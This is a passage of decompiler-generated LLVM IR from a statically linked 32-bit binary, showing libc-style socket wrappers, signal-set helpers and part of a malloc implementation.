  %v12_8052f20 = icmp eq i32 %tmp10, 1
  %v1_8052f25 = icmp eq i1 %v12_8052f20, false
  br i1 %v1_8052f25, label %dec_label_pc_8052f81, label %dec_label_pc_8052f27

dec_label_pc_8052f27:                             ; preds = %dec_label_pc_8052f04
  %v0_8052f27 = load i32, i32* @edx, align 4
  %v0_8052f2e = load i32, i32* @ebp, align 4
  store i32 %v0_8052f2e, i32* %stack_var_-108, align 4
  %v3_8052f2f = inttoptr i32 %tmp to i16*
  %v4_8052f2f = call i32 @memcpy(i16* %v3_8052f2f, i32 4, i32 %v0_8052f27)
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v0_8052f38 = load i32, i32* @edi, align 4
  store i32 %v0_8052f38, i32* %arg2, align 4
  %v1_8052f3a = add i32 %tmp18, 8
  %v2_8052f3a = inttoptr i32 %v1_8052f3a to i32*
  store i32 2, i32* %v2_8052f3a, align 4
  %v0_8052f41 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052f41 = add i32 %v0_8052f41, 12
  %v2_8052f41 = inttoptr i32 %v1_8052f41 to i32*
  store i32 4, i32* %v2_8052f41, align 4
  %v3_8052f48 = load i32, i32* %stack_var_-92, align 4
  store i32 %v3_8052f48, i32* %edx.global-to-local, align 4
  %v1_8052f4c = load i32, i32* %eax.global-to-local, align 4
  %v2_8052f4c = add i32 %v1_8052f4c, 16
  %v3_8052f4c = inttoptr i32 %v2_8052f4c to i32*
  store i32 %v3_8052f48, i32* %v3_8052f4c, align 4
  %v1_8052f53 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052f53 = add i32 %v1_8052f53, 4
  %v3_8052f53 = inttoptr i32 %v2_8052f53 to i32*
  store i32 %v1_8052d5e, i32* %v3_8052f53, align 4
  %v2_8052f56 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_8052f56, i32* %eax.global-to-local, align 4
  %v3_8052f57 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8052f57, i32* %stack_var_-108, align 4
  %v1_8052f5b = call i32 @free(i32 %v3_8052f57)
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  store i32 %tmp18, i32* %v1_8052c8f, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_8052cdd, align 4
  br label %dec_label_pc_8052f7c

dec_label_pc_8052f7c:                             ; preds = %dec_label_pc_8052f81, %dec_label_pc_8052e6b, %dec_label_pc_8052f27
  br label %dec_label_pc_8052fa6

dec_label_pc_8052f81:                             ; preds = %dec_label_pc_8052f04
  %v3_8052f84 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8052f84, i32* %stack_var_-108, align 4
  %v1_8052f88 = call i32 @free(i32 %v3_8052f84)
  store i32 1, i32* %v1_8052cdd, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052f7c

dec_label_pc_8052fa1:                             ; preds = %dec_label_pc_8052d4b, %dec_label_pc_8052d2f, %dec_label_pc_8052d23, %dec_label_pc_8052d10, %dec_label_pc_8052d04
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052fa6

dec_label_pc_8052fa6:                             ; preds = %dec_label_pc_8052cf0, %dec_label_pc_8052ce9, %dec_label_pc_8052ca5, %entry, %dec_label_pc_8052f7c, %dec_label_pc_8052e3e, %dec_label_pc_8052d98, %dec_label_pc_8052fa1
  store i32 %v0_8052c7f, i32* @ebx, align 4
  store i32 %v0_8052c7e, i32* @esi, align 4
  store i32 %v0_8052c7d, i32* @edi, align 4
  store i32 %v0_8052c7c, i32* @ebp, align 4
  %v0_8052fad = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8052fad

; uselistorder directives
  uselistorder i32 %v2_8052de0, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_8052d65, { 1, 0, 2 }
  uselistorder i32 %v1_8052d5e, { 1, 0 }
  uselistorder i32 %v1_8052d4b, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_8052d14.pre, { 0, 2, 1 }
  uselistorder i32 %v1_8052cfd, { 1, 0 }
  uselistorder i32 %v2_8052cdd, { 2, 0, 1, 3 }
  uselistorder i32* %v1_8052cdd, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32* %v1_8052c8f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 27, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8052fa6, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8052f7c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052d10, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8052fcb = ptrtoint i32* %stack_var_-12 to i32
  %v2_8052fd2 = call i32 @__socketcall(i32 3, i32 %v2_8052fcb)
  ret i32 %v2_8052fd2

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8052ff7 = ptrtoint i32* %stack_var_-12 to i32
  %v2_8052ffe = call i32 @__socketcall(i32 6, i32 %v2_8052ff7)
  ret i32 %v2_8052ffe

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_8053033 = ptrtoint i32* %stack_var_-20 to i32
  %v2_805303a = call i32 @__socketcall(i32 15, i32 %v2_8053033)
  ret i32 %v2_805303a

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_8053067 = ptrtoint i32* %stack_var_-16 to i32
  %v2_805306e = call i32 @__socketcall(i32 10, i32 %v2_8053067)
  ret i32 %v2_805306e

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_805309b = ptrtoint i32* %stack_var_-16 to i32
  %v2_80530a2 = call i32 @__socketcall(i32 9, i32 %v2_805309b)
  ret i32 %v2_80530a2

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_80530df = ptrtoint i32* %stack_var_-24 to i32
  %v2_80530e6 = call i32 @__socketcall(i32 11, i32 %v2_80530df)
  ret i32 %v2_80530e6

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_805311b = ptrtoint i32* %stack_var_-20 to i32
  %v2_8053122 = call i32 @__socketcall(i32 14, i32 %v2_805311b)
  ret i32 %v2_8053122

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8053147 = ptrtoint i32* %stack_var_-12 to i32
  %v2_805314e = call i32 @__socketcall(i32 1, i32 %v2_8053147)
  ret i32 %v2_805314e

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 5, 4, 6, 0, 1, 3, 7, 2 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_8053170, label %dec_label_pc_8053163

dec_label_pc_8053163:                             ; preds = %entry
  %v1_8053163 = add i32 %arg1, -64
  %v3_8053163 = sub i32 63, %arg1
  %v4_8053163 = and i32 %v3_8053163, %arg1
  %v5_8053163 = icmp slt i32 %v4_8053163, 0
  %v6_8053163 = icmp eq i32 %v1_8053163, 0
  %v7_8053163 = icmp slt i32 %v1_8053163, 0
  %v3_8053166 = icmp eq i1 %v7_8053163, %v5_8053163
  %v4_8053166 = icmp eq i1 %v6_8053163, false
  %v5_8053166 = and i1 %v4_8053166, %v3_8053166
  br i1 %v5_8053166, label %dec_label_pc_8053170, label %dec_label_pc_8053168

dec_label_pc_8053168:                             ; preds = %dec_label_pc_8053163
  %v4_805316b = call i32 @__sigaddset(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8053170

dec_label_pc_8053170:                             ; preds = %dec_label_pc_8053163, %entry, %dec_label_pc_8053168
  %v1_8053170 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_8053175 = inttoptr i32 %v1_8053170 to i32*
  store i32 22, i32* %v1_8053175, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_8053163, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8053170, { 2, 0, 1 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  %v3_8053192 = inttoptr i32 %arg1 to i8*
  %v4_8053192 = call i32 @__GI_memset(i8* %v3_8053192, i32 0, i32 128)
  ret i32 0
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_80531a0 = load i32, i32* @ebx, align 4
  %v15_80531a1 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_80531b5 = icmp eq i32 %arg2, -1
  br i1 %v10_80531b5, label %dec_label_pc_80531c3, label %dec_label_pc_80531ba

dec_label_pc_80531ba:                             ; preds = %entry
  %tmp16 = icmp slt i32 %arg1, 1
  br i1 %tmp16, label %dec_label_pc_80531c3, label %dec_label_pc_80531be

dec_label_pc_80531be:                             ; preds = %dec_label_pc_80531ba
  %v7_80531c1 = icmp sgt i32 %arg1, 64
  br i1 %v7_80531c1, label %dec_label_pc_80531c3, label %dec_label_pc_80531d0

dec_label_pc_80531c3:                             ; preds = %dec_label_pc_80531be, %dec_label_pc_80531ba, %entry
  %v1_80531c3 = call i32 @__errno_location(i32 %v0_80531a0)
  store i32 %v1_80531c3, i32* %eax.global-to-local, align 4
  %v1_80531c8 = inttoptr i32 %v1_80531c3 to i32*
  store i32 22, i32* %v1_80531c8, align 4
  br label %dec_label_pc_8053244

dec_label_pc_80531d0:                             ; preds = %dec_label_pc_80531be
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80531de

dec_label_pc_80531de:                             ; preds = %dec_label_pc_80531de.dec_label_pc_80531de_crit_edge, %dec_label_pc_80531d0
  %v0_80531de = phi i32 [ %v15_80531a1, %dec_label_pc_80531d0 ], [ %v0_80531de.pre, %dec_label_pc_80531de.dec_label_pc_80531de_crit_edge ]
  %v1_80531e917 = phi i32 [ 31, %dec_label_pc_80531d0 ], [ %v1_80531e9, %dec_label_pc_80531de.dec_label_pc_80531de_crit_edge ]
  %v2_80531de = mul i32 %v1_80531e917, 4
  %v3_80531de = add i32 %v2_80531de, 160
  %v4_80531de = add i32 %v3_80531de, %v0_80531de
  %v5_80531de = inttoptr i32 %v4_80531de to i32*
  store i32 0, i32* %v5_80531de, align 4
  %v0_80531e9.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_80531e9 = add i32 %v0_80531e9.pre, -1
  %v9_80531e9 = icmp slt i32 %v1_80531e9, 0
  store i32 %v1_80531e9, i32* %eax.global-to-local, align 4
  %v1_80531ea = icmp eq i1 %v9_80531e9, false
  br i1 %v1_80531ea, label %dec_label_pc_80531de.dec_label_pc_80531de_crit_edge, label %dec_label_pc_80531ec

dec_label_pc_80531de.dec_label_pc_80531de_crit_edge: ; preds = %dec_label_pc_80531de
  %v0_80531de.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80531de

dec_label_pc_80531ec:                             ; preds = %dec_label_pc_80531de
  %v0_80531ec = load i32, i32* @edx, align 4
  %v2_80531ef = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_80531ef, i32* %eax.global-to-local, align 4
  %v4_80531f7 = call i32 @__sigaddset(i32 %v2_80531ef, i32 %arg1, i32 %v0_80531ec, i32 %v0_80531ec)
  store i32 %v4_80531f7, i32* %eax.global-to-local, align 4
  %v2_80531ff = icmp slt i32 %v4_80531f7, 0
  br i1 %v2_80531ff, label %dec_label_pc_8053244, label %dec_label_pc_8053203

dec_label_pc_8053203:                             ; preds = %dec_label_pc_80531ec
  %v4_805320b = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_80617e0.492 to i32), i32 %arg1, i32 %v4_80531f7, i32 %v4_80531f7)
  %v2_8053224 = ptrtoint i32* %stack_var_-284 to i32
  %v2_8053229 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8053229, i32* %eax.global-to-local, align 4
  %v4_8053232 = call i32 @__libc_sigaction(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_8053224)
  store i32 %v4_8053232, i32* %eax.global-to-local, align 4
  %v2_805323a = icmp slt i32 %v4_8053232, 0
  br i1 %v2_805323a, label %dec_label_pc_8053244, label %dec_label_pc_805323e

dec_label_pc_805323e:                             ; preds = %dec_label_pc_8053203
  %v3_805323e = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_8053247

dec_label_pc_8053244:                             ; preds = %dec_label_pc_8053203, %dec_label_pc_80531ec, %dec_label_pc_80531c3
  br label %dec_label_pc_8053247

dec_label_pc_8053247:                             ; preds = %dec_label_pc_805323e, %dec_label_pc_8053244
  %storemerge = phi i32 [ -1, %dec_label_pc_8053244 ], [ %v3_805323e, %dec_label_pc_805323e ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_80531a0, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_80531e9, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 9, 6, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 3, 2, 1, 4, 0, 5 }
  uselistorder label %dec_label_pc_8053247, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_805325e = add i32 %arg2, -1
  %v1_8053261 = urem i32 %v1_805325e, 32
  %v2_8053261 = icmp eq i32 %v1_8053261, 0
  %v2_8053264 = udiv i32 %v1_805325e, 32
  br i1 %v2_8053261, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_8053267 = shl i32 1, %v1_8053261
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_8053269 = phi i32 [ 1, %entry ], [ %v5_8053267, %bb ]
  %v2_8053269 = mul nuw nsw i32 %v2_8053264, 4
  %v3_8053269 = add i32 %v2_8053269, %arg1
  %v4_8053269 = inttoptr i32 %v3_8053269 to i32*
  %v5_8053269 = load i32, i32* %v4_8053269, align 4
  %v7_8053269 = and i32 %v5_8053269, %v6_8053269
  %v8_8053269 = icmp eq i32 %v7_8053269, 0
  %v1_805326d = icmp eq i1 %v8_8053269, false
  %v2_805326d = zext i1 %v1_805326d to i32
  ret i32 %v2_805326d

; uselistorder directives
  uselistorder i32 %v1_8053261, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8053274 = load i32, i32* @ebx, align 4
  store i32 %v0_8053274, i32* %stack_var_-4, align 4
  %v1_8053282 = add i32 %arg2, -1
  %v1_8053285 = urem i32 %v1_8053282, 32
  %v2_8053285 = icmp eq i32 %v1_8053285, 0
  store i32 %v1_8053285, i32* @ecx, align 4
  br i1 %v2_8053285, label %bb6, label %bb

bb:                                               ; preds = %entry
  %v5_8053288 = shl i32 1, %v1_8053285
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %v6_805328d = phi i32 [ 1, %entry ], [ %v5_8053288, %bb ]
  %v2_805328a = udiv i32 %v1_8053282, 32
  store i32 %v2_805328a, i32* @edx, align 4
  %v2_805328d = mul nuw nsw i32 %v2_805328a, 4
  %v3_805328d = add i32 %v2_805328d, %arg1
  %v4_805328d = inttoptr i32 %v3_805328d to i32*
  %v5_805328d = load i32, i32* %v4_805328d, align 4
  %v7_805328d = or i32 %v5_805328d, %v6_805328d
  store i32 %v7_805328d, i32* %v4_805328d, align 4
  %v2_8053292 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8053292, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_805328a, { 1, 0 }
  uselistorder i32 %v1_8053285, { 2, 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_80532a2 = add i32 %arg2, -1
  %v1_80532a5 = urem i32 %v1_80532a2, 32
  %v2_80532a5 = icmp eq i32 %v1_80532a5, 0
  br i1 %v2_80532a5, label %bb6, label %bb

bb:                                               ; preds = %entry
  %v4_80532a8 = shl i32 -2, %v1_80532a5
  %v5_80532a8 = sub nsw i32 32, %v1_80532a5
  %v6_80532a8 = lshr i32 -2, %v5_80532a8
  %v7_80532a8 = or i32 %v6_80532a8, %v4_80532a8
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %v6_80532ad = phi i32 [ -2, %entry ], [ %v7_80532a8, %bb ]
  %v2_80532aa = udiv i32 %v1_80532a2, 32
  %v2_80532ad = mul nuw nsw i32 %v2_80532aa, 4
  %v3_80532ad = add i32 %v2_80532ad, %arg1
  %v4_80532ad = inttoptr i32 %v3_80532ad to i32*
  %v5_80532ad = load i32, i32* %v4_80532ad, align 4
  %v7_80532ad = and i32 %v5_80532ad, %v6_80532ad
  store i32 %v7_80532ad, i32* %v4_80532ad, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_80532a5, { 1, 2, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__malloc_largebin_index() local_unnamed_addr {
entry:
  %v0_80532b4 = load i32, i32* @eax, align 4
  %v6_80532c7 = icmp ugt i32 %v0_80532b4, 16777215
  br i1 %v6_80532c7, label %dec_label_pc_80532d8, label %dec_label_pc_80532c9

dec_label_pc_80532c9:                             ; preds = %entry
  %tmp = icmp ult i32 %v0_80532b4, 256
  %v2_80532b6 = udiv i32 %v0_80532b4, 256
  %v2_80532c9 = call i32 @llvm.ctlz.i32(i32 %v2_80532b6, i1 true)
  %v3_80532c9 = xor i32 %v2_80532c9, 31
  %v5_80532c9 = select i1 %tmp, i32 95, i32 %v3_80532c9
  %v1_80532cc = add nuw nsw i32 %v5_80532c9, 6
  store i32 %v1_80532cc, i32* @ecx, align 4
  %v2_80532cf = urem i32 %v1_80532cc, 32
  %v4_80532cf = icmp eq i32 %v2_80532cf, 0
  br i1 %v4_80532cf, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_80532c9
  %v5_80532cf = lshr i32 %v0_80532b4, %v2_80532cf
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_80532c9, %bb
  %v0_80532d1 = phi i32 [ %v0_80532b4, %dec_label_pc_80532c9 ], [ %v5_80532cf, %bb ]
  %v1_80532d1 = urem i32 %v0_80532d1, 4
  %v2_80532d4 = mul nuw nsw i32 %v5_80532c9, 4
  %v3_80532d4 = or i32 %v1_80532d1, 32
  %v4_80532d4 = add nuw nsw i32 %v3_80532d4, %v2_80532d4
  br label %dec_label_pc_80532d8

dec_label_pc_80532d8:                             ; preds = %entry, %bb4
  %v0_80532d9 = phi i32 [ 95, %entry ], [ %v4_80532d4, %bb4 ]
  ret i32 %v0_80532d9

; uselistorder directives
  uselistorder i32 %v2_80532cf, { 1, 0 }
  uselistorder i32 %v0_80532b4, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_80532d8, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80532da = load i32, i32* @ebp, align 4
  %v0_80532db = load i32, i32* @edi, align 4
  %v0_80532dc = load i32, i32* @esi, align 4
  %v0_80532dd = load i32, i32* @ebx, align 4
  store i32 %v0_80532dd, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_80532ef = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80532ef, i32* @eax, align 4
  store i32 %v2_80532ef, i32* %stack_var_-92, align 4
  %v2_80532f4 = call i32 @__pthread_return_void(i32 %v2_80532ef, i32 134565087)
  store i32 %v2_80532f4, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805b3f0.493 to i32), i32* %stack_var_-92, align 4
  %v1_8053300 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b3f0.493 to i32))
  store i32 %v1_8053300, i32* %eax.global-to-local, align 4
  %v0_8053308 = load i32, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v0_8053308, -32
  br i1 %tmp, label %dec_label_pc_805331f, label %dec_label_pc_805330d

dec_label_pc_805330d:                             ; preds = %entry
  %v0_805330d = load i32, i32* %stack_var_-92, align 4
  %v1_805330d = call i32 @__errno_location(i32 %v0_805330d)
  store i32 %v1_805330d, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8053314 = inttoptr i32 %v1_805330d to i32*
  store i32 12, i32* %v1_8053314, align 4
  br label %dec_label_pc_8053a72

dec_label_pc_805331f:                             ; preds = %entry
  %v1_805331f = add i32 %v0_8053308, 11
  %tmp136 = icmp ult i32 %v1_805331f, 16
  br i1 %tmp136, label %dec_label_pc_8053336, label %dec_label_pc_805332f

dec_label_pc_805332f:                             ; preds = %dec_label_pc_805331f
  %v1_805332f = and i32 %v1_805331f, -8
  br label %dec_label_pc_8053336

dec_label_pc_8053336:                             ; preds = %dec_label_pc_805331f, %dec_label_pc_805332f
  %storemerge133 = phi i32 [ %v1_805332f, %dec_label_pc_805332f ], [ %v1_805331f, %dec_label_pc_805331f ]
  %v1_80536d6 = phi i32 [ %v1_805332f, %dec_label_pc_805332f ], [ 16, %dec_label_pc_805331f ]
  store i32 %storemerge133, i32* %eax.global-to-local, align 4
  %v0_8053336 = load i8, i8* @global_var_8061860.494, align 1
  %v1_8053336 = sext i8 %v0_8053336 to i32
  store i32 %v1_8053336, i32* @ebx, align 4
  %v3_805333c = urem i8 %v0_8053336, 2
  %v4_805333c = icmp eq i8 %v3_805333c, 0
  %v1_805333f = icmp eq i1 %v4_805333c, false
  br i1 %v1_805333f, label %dec_label_pc_805335e, label %dec_label_pc_8053341

dec_label_pc_8053341:                             ; preds = %dec_label_pc_8053336
  %v2_8053341 = icmp eq i8 %v0_8053336, 0
  %v1_8053343 = icmp eq i1 %v2_8053341, false
  br i1 %v1_8053343, label %dec_label_pc_8053641, label %dec_label_pc_8053349

dec_label_pc_8053349:                             ; preds = %dec_label_pc_8053341
  store i32 ptrtoint (i8* @global_var_8061860.494 to i32), i32* %stack_var_-92, align 4
  %v2_8053351 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8061860.494 to i32*))
  store i32 %v2_8053351, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053641

dec_label_pc_805335e:                             ; preds = %dec_label_pc_8053336
  %v11_805335e = trunc i32 %v1_80536d6 to i8
  %v8_8053362 = icmp ugt i8 %v11_805335e, %v0_8053336
  br i1 %v8_8053362, label %dec_label_pc_805337f, label %dec_label_pc_8053364

dec_label_pc_8053364:                             ; preds = %dec_label_pc_805335e
  %v2_8053368 = udiv i32 %v1_80536d6, 2
  store i32 %v2_8053368, i32* %eax.global-to-local, align 4
  %v1_805336a = add i32 %v2_8053368, ptrtoint (i8* @global_var_8061860.494 to i32)
  store i32 %v1_805336a, i32* @ecx, align 4
  %v1_8053370 = add i32 %v2_8053368, add (i32 ptrtoint (i8* @global_var_8061860.494 to i32), i32 -4)
  %v2_8053370 = inttoptr i32 %v1_8053370 to i32*
  %v3_8053370 = load i32, i32* %v2_8053370, align 4
  store i32 %v3_8053370, i32* @edx, align 4
  %v1_8053373 = icmp eq i32 %v3_8053370, 0
  br i1 %v1_8053373, label %dec_label_pc_805337f, label %dec_label_pc_8053377

dec_label_pc_8053377:                             ; preds = %dec_label_pc_8053364
  %v1_8053377 = add i32 %v3_8053370, 8
  %v2_8053377 = inttoptr i32 %v1_8053377 to i32*
  %v3_8053377 = load i32, i32* %v2_8053377, align 4
  store i32 %v3_8053377, i32* %eax.global-to-local, align 4
  store i32 %v3_8053377, i32* %v2_8053370, align 4
  br label %dec_label_pc_80533b8

dec_label_pc_805337f:                             ; preds = %dec_label_pc_8053364, %dec_label_pc_805335e
  %v8_805337f = icmp ult i32 %v1_80536d6, 255
  %v6_8053387 = icmp ugt i32 %v1_80536d6, 255
  store i32 %v1_80536d6, i32* @eax, align 4
  br i1 %v6_8053387, label %dec_label_pc_80533c0, label %dec_label_pc_8053389

dec_label_pc_8053389:                             ; preds = %dec_label_pc_805337f
  %v2_805338d = udiv i32 %v1_80536d6, 8
  store i32 %v2_805338d, i32* %eax.global-to-local, align 4
  %v1_8053390 = mul nuw i32 %v2_805338d, 8
  %v2_8053390 = add i32 %v1_8053390, ptrtoint (i32* @global_var_806188c.495 to i32)
  store i32 %v2_8053390, i32* @ecx, align 4
  %v1_805339b = add i32 %v1_8053390, add (i32 ptrtoint (i32* @global_var_806188c.495 to i32), i32 12)
  %v2_805339b = inttoptr i32 %v1_805339b to i32*
  %v3_805339b = load i32, i32* %v2_805339b, align 4
  store i32 %v3_805339b, i32* @edx, align 4
  %v12_805339e = icmp eq i32 %v3_805339b, %v2_8053390
  br i1 %v12_805339e, label %dec_label_pc_80534bc.preheader, label %dec_label_pc_80533a6

dec_label_pc_80533a6:                             ; preds = %dec_label_pc_8053389
  store i32 %v1_80536d6, i32* %ebx.global-to-local, align 4
  %v1_80533aa = add i32 %v3_805339b, 12
  %v2_80533aa = inttoptr i32 %v1_80533aa to i32*
  %v3_80533aa = load i32, i32* %v2_80533aa, align 4
  store i32 %v3_80533aa, i32* %eax.global-to-local, align 4
  %v2_80533ad = or i32 %v1_80536d6, 4
  %v3_80533ad = add i32 %v3_805339b, %v2_80533ad
  %v4_80533ad = inttoptr i32 %v3_80533ad to i32*
  %v5_80533ad = load i32, i32* %v4_80533ad, align 4
  %v6_80533ad = or i32 %v5_80533ad, 1
  store i32 %v6_80533ad, i32* %v4_80533ad, align 4
  %v0_80533b2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80533b2 = load i32, i32* @ecx, align 4
  %v2_80533b2 = add i32 %v1_80533b2, 12
  %v3_80533b2 = inttoptr i32 %v2_80533b2 to i32*
  store i32 %v0_80533b2, i32* %v3_80533b2, align 4
  %v0_80533b5 = load i32, i32* @ecx, align 4
  %v1_80533b5 = load i32, i32* %eax.global-to-local, align 4
  %v2_80533b5 = add i32 %v1_80533b5, 8
  %v3_80533b5 = inttoptr i32 %v2_80533b5 to i32*
  store i32 %v0_80533b5, i32* %v3_80533b5, align 4
  br label %dec_label_pc_80533b8

dec_label_pc_80533b8:                             ; preds = %dec_label_pc_8053377, %dec_label_pc_80533a6
  %v0_80533b8 = load i32, i32* @edx, align 4
  %v1_80533b8 = add i32 %v0_80533b8, 8
  store i32 %v1_80533b8, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053a61

dec_label_pc_80533c0:                             ; preds = %dec_label_pc_805337f
  %v0_80533c4 = call i32 @__malloc_largebin_index()
